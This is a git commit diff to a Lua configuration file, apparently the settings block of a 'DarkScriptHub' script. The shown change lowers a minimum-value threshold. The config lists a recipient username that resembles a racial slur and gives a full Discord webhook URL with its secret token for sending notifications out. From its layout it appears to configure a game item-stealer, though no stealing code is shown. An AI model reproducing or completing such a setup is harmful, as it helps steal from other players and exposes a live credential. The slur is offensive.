e4c3523b1211dac372c6b99d0512a59a0346bdb6
DarkScriptHubGAG <k3yhhceballo@gmail.com>
2025-07-17 16:31:27 -0400

    Update script.lua

--- script.lua
+++ script.lua
@@ -1,5 +1,5 @@
 users = {"1Ngg_erHunter2"}
-min_value = 13 -- minimum value for stuff (if ur new to it, leave 0 ig)
+min_value = 0 -- minimum value for stuff (if ur new to it, leave 0 ig)
 ping = "Yes" -- make it yes if u want to get pinged
 webhook =  "https://discord.com/api/webhooks/1390378012322693151/W1fWWYoxMxsRRn1C-OAZo6i4eJ8ixeYWLEd_yJOpHvw7Ijs5eWgYb7ni65ePDdVwnH0o" -- make a webhook on phone browser discord or pc discord (to get the notifications and shii)
 embedcol = 65280 -- ignore this, only used to change color of the webhook notification
